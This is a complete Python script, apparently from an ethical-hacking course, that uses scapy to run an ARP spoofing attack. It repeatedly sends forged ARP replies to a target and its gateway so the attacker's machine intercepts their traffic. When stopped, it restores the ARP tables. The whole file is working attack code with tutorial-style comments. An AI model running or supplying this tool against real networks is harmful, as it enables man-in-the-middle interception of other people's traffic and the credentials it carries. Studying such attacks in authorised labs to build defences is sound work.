#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import argparse


def get_ip():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Specify target ip")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Specify gateway ip")
    options = parser.parse_args()   #get values from the values enteres and assign them to variable options

    if not options.target_ip:
        parser.error("[-] Specify an IP address for the target, --help for more info")
    elif not options.gateway_ip:
        parser.error("[-] Specify an IP address for the gateway, --help for more info")

    return options   #will contain only the values of the target and gateway IP addresses


def get_mac(ip):
    arp_header = scapy.ARP(pdst=ip) #created an IP header that enables Address Resolution Protocol (ARP) which gets a devices' mac address --> resolves ip address to mac addresses
    ether_header = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #ether header enables us to create an ether packet, helps to specify the dest get_mac
    arp_request_packet = ether_header / arp_header # joining these two creates a complete arp arp packet
    answered_list = scapy.srp(arp_request_packet, timeout=1, verbose=False)[0]   #srp function sends out the arp packet, assigned timeout=1, waits 1 second for response, we don't need verbosity

    return answered_list[0][1].hwsrc # first list is the mac address, second list is the response


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)     #call get_mac and assign it to target_mac
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) # created an ARP response packet, trying to pretend to be the destination
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):  #restores proper communication
    destination_mac = get_mac(destination_ip)
    sourse_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=sourse_mac)
    scapy.send(packet, count=4, verbose=False) #this packet will continuously send 4 types of packet


options = get_ip()

try:
    sent_packet_count = 0     #exception handling
    while True:              #infinite loop
        spoof(options.target_ip, options.gateway_ip)   #fool target that we are the gateway
        spoof(options.gateway_ip, options.target_ip)
        sent_packet_count = sent_packet_count + 2
        print("\r[+] Sent packets: " + str(sent_packet_count)),
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[+] Ctrl + C detected.....Restoring ARP Tables Please Wait!")
    restore(options.target_ip, options.gateway_ip)
    restore(options.gateway_ip, options.target_ip)
